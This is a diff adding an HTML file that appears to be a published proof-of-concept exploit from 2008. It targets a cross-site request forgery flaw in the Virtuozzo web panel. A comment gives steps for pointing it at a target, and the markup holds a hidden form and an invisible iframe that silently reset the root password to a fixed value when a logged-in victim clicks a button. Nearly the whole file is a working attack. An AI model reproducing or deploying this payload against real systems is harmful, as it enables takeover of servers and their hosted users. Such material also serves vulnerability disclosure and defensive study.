@@ -1,0 +1,28 @@
+&lt;!--
+poplix papuasia.org -- http://px.dynalias.org -- 04-02-2008
+
+this file exploits a vulnerable installation of virtuozzo web panel by
+setting root password to &quot;csrfsafepass&quot;
+tested against Version 25.4.swsoft (build: 3.0.0-25.4.swsoft)
+perform the following steps to test it:
+1. in this file replace 127.0.0.1 with target vps address
+2. open a web browser and log into virtuozzo web interface
+3. open this file in a new browser window and click the &quot;change pwd&quot;
+--&gt;
+
+
+&lt;form target=vrtifr name=&quot;defaultForm&quot; method=&quot;post&quot;
+	action=&quot;https://127.0.0.1:4643/vz/cp/pwd&quot;&gt;
+
+ &lt;input type=&quot;hidden&quot; name=&quot;passwd&quot;  value=&quot;csrfsafepass&quot;&gt;
+ &lt;input type=&quot;hidden&quot; name=&quot;retype&quot;  value=&quot;csrfsafepass&quot;&gt;
+ &lt;input type=&quot;hidden&quot; name=&quot;_submit&quot; value=&quot;Change&quot; &gt;
+&lt;/form&gt;
+
+&lt;iframe style=&quot;width:1px;height:1px;visibility:hidden&quot; 
+name=&quot;vrtifr&quot;&gt;&lt;/iframe&gt;
+
+&lt;input type=button value=&quot;change pwd&quot; 
+onclick=&quot;document.defaultForm.submit()&quot;&gt;
+
+
